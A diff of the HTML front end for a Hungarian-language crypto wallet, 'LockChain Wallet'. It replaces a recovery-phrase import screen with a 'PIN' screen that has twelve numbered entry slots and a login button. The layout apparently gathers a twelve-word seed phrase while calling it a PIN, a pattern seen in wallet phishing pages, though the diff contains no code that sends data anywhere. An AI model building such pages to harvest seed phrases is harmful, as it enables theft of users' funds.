@@ -1,25 +1,46 @@
-
 <!DOCTYPE html>
 <html lang="hu">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>LockChain Wallet - Importálás</title>
-  <link rel="stylesheet" href="pin.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LockChain Wallet – PIN</title>
+  <link rel="stylesheet" href="pin.css">
 </head>
 <body>
 
-  <div id="import" class="screen">
-    <div class="mini-logo">
-      <div class="lock small"></div>
-    </div>
-    <h1>Tárca importálása</h1>
-    <p>Írd be a meglévő tárcád kulcsát vagy recovery phrase-ét a folytatáshoz.</p>
-
-    <input type="text" placeholder="Tárca kulcs vagy recovery phrase" class="input-field" />
-    <button class="btn">Importálás</button>
-    <button class="btn secondary" onclick="window.location.href='index.html'">Vissza</button>
+  <div class="top-bar">
+    <h1>LockChain Wallet</h1>
+    <div class="lang">HU 🇭🇺</div>
   </div>
+
+  <div class="pin-card">
+    <div class="pin-grid">
+      <div class="pin-item"><span>1.</span><div class="slot"></div></div>
+      <div class="pin-item"><span>7.</span><div class="slot"></div></div>
+
+      <div class="pin-item"><span>2.</span><div class="slot"></div></div>
+      <div class="pin-item"><span>8.</span><div class="slot"></div></div>
+
+      <div class="pin-item"><span>3.</span><div class="slot"></div></div>
+      <div class="pin-item"><span>9.</span><div class="slot"></div></div>
+
+      <div class="pin-item"><span>4.</span><div class="slot"></div></div>
+      <div class="pin-item"><span>10.</span><div class="slot"></div></div>
+
+      <div class="pin-item"><span>5.</span><div class="slot"></div></div>
+      <div class="pin-item"><span>11.</span><div class="slot"></div></div>
+
+      <div class="pin-item"><span>6.</span><div class="slot"></div></div>
+      <div class="pin-item"><span>12.</span><div class="slot"></div></div>
+    </div>
+
+    <div class="icons">
+      <div class="icon danger">⛔</div>
+      <div class="icon">📋</div>
+    </div>
+  </div>
+
+  <button class="login-btn">Bejelentkezek</button>
 
 </body>
 </html>
